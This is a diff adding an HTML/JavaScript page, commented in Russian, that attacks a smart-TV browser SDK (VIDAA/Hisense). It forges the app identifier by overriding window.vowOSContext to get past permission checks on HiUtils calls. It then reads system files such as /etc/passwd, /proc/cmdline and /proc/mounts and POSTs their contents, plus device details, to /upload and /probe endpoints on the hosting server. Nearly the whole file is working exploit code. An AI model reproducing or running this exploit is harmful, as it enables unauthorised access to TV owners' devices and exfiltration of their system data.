@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>tv identifier forgery</title>
+<style>
+ body{font:16px/1.3 sans-serif;background:#111;color:#eee;margin:0;padding:16px}
+ h1{font-size:18px;margin:0 0 8px}
+ #log{white-space:pre-wrap;font-family:monospace;font-size:12px}
+ .ok{color:#6f6}.bad{color:#f66}.dim{color:#888}.hit{color:#ff0}
+</style>
+</head>
+<body>
+<h1>подстановка identifier <small class="dim">read-only, записи нет</small></h1>
+<div id="log"></div>
+<script>
+/* SDK берёт идентичность так:
+     getIdentifier() -> window.vowOSContext.getAppIdentifier()
+   и отправляет её заголовком "identifier" в POST /service/<name>.
+   Значит можно подставить своё значение и посмотреть, снимутся ли
+   appconfig-отказы и появится ли корень вместо "undefined".
+   fileWrite не вызывается ни разу. */
+var API = "", out = { env: {}, tries: [], files: [] };
+var FILES = ["/etc/version", "/etc/passwd", "/etc/group", "/etc/hosts", "/proc/version",
+             "/proc/cmdline", "/proc/mounts", "/etc/inittab", "/etc/os-release"];
+
+function log(m, c) {
+  var el = document.getElementById("log"), d = document.createElement("div");
+  if (c) d.className = c; d.textContent = String(m).slice(0, 380); el.appendChild(d);
+}
+function post(p, o, cb) {
+  try { var x = new XMLHttpRequest(); x.open("POST", API + p, true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.onreadystatechange = function () { if (x.readyState === 4 && cb) cb(x.status); };
+    x.send(JSON.stringify(o)); } catch (e) { if (cb) cb(0); }
+}
+function setIdent(v) { window.vowOSContext = { getAppIdentifier: function () { return v; } }; }
+function call(api, args) {
+  try { return window.HiUtils_createRequest(api, args); }
+  catch (e) { return { thrown: String(e && e.message || e) }; }
+}
+function js(r) { try { return JSON.stringify(r).slice(0, 320); } catch (e) { return String(r).slice(0, 200); } }
+
+out.env = {
+  hasContext: !!window.vowOSContext,
+  contextType: typeof window.vowOSContext,
+  navAppId: (function () { try { return String(window.navigator.appIdentifier); } catch (e) { return "err"; } })(),
+  identifierNow: (function () { try { return window.vowOS.service.getIdentifier(); } catch (e) { return "err:" + e; } })()
+};
+for (var k in out.env) log(k + " -> " + out.env[k], "dim");
+
+/* кандидаты: имена пакетов с телевизора + служебные */
+var CANDS = ["tv.vidaa.app.browser", "com.hisense.browser", "tv.vidaa.res.iot",
+             "browser", "system", "root", "vidaa", "hisense", "tv.vidaa.app.settings",
+             "com.vidaa.browser", "tv.vidaa.app.browser/9.6.0", "APPS:pkgs/tv.vidaa.app.browser"];
+
+var idx = 0, winner = null;
+function next() {
+  if (idx >= CANDS.length) return afterCands();
+  var id = CANDS[idx++];
+  setIdent(id);
+  var dev = call("deviceCode");
+  var fr = call("fileRead", { path: "/etc/version" });
+  var sDev = js(dev), sFr = js(fr);
+  var devOk = sDev.indexOf("503") < 0 && sDev.indexOf("permission") < 0;
+  var pathLine = "";
+  try { pathLine = fr.msg.path || ""; } catch (e) {}
+  var prefixed = pathLine.indexOf("undefined") >= 0;
+  out.tries.push({ id: id, deviceCode: sDev, fileRead: sFr, devOk: devOk, stillUndefined: prefixed });
+  log((devOk || !prefixed ? "HIT  " : "     ") + id + " | deviceCode: " + (devOk ? "PASS" : "503") +
+      " | path: " + (pathLine || sFr.slice(0, 80)), (devOk || !prefixed) ? "hit" : "dim");
+  if (!prefixed || devOk) winner = winner || id;
+  setTimeout(next, 60);
+}
+
+function afterCands() {
+  if (!winner) { log("ни один идентификатор не изменил поведение", "bad"); return finish(); }
+  log("победил: " + winner + " — читаю файлы", "ok");
+  setIdent(winner);
+  var i = 0;
+  function one() {
+    if (i >= FILES.length) return finish();
+    var p = FILES[i++];
+    var r = call("fileRead", { path: p });
+    var ok = r && r.ret;
+    out.files.push({ path: p, ret: !!(r && r.ret), result: ok ? r.msg : js(r) });
+    log((ok ? "ok   " : "err  ") + p, ok ? "ok" : "bad");
+    post("/upload", { path: p, type: "file", strategy: "hiutils/fileRead",
+                      status: ok ? "ok" : "error",
+                      data: ok ? (typeof r.msg === "string" ? r.msg : JSON.stringify(r.msg)) : null,
+                      error: ok ? null : js(r) }, function () { setTimeout(one, 100); });
+  }
+  one();
+}
+
+function finish() {
+  out.userAgent = navigator.userAgent;
+  post("/probe", Object.assign({ name: "identfor" }, out), function (st) {
+    log(st === 200 ? "готово: отправлено" : "ошибка отправки " + st, st === 200 ? "ok" : "bad");
+  });
+}
+next();
+</script>
+</body>
+</html>
